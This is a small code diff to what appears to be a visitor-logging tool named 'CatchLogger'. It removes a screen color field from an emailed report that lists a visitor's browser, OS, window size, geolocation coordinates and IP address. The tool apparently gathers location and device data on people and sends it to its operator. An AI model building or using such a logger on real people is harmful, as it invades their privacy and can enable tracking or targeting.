@@ -71,7 +71,6 @@ OS: %s
 Window:
 Height: %s
 Width: %s
-Color number: %s
 
 Location:
 latitude: %s
@@ -81,7 +80,7 @@ Radius: %s
 IP = %s
 
 ----
-CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['h'], d['w'], d['c'], d['lat'], d['long'], d['rad'], ip)
+CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['h'], d['w'], d['lat'], d['long'], d['rad'], ip)
     send_email(text)
     
 
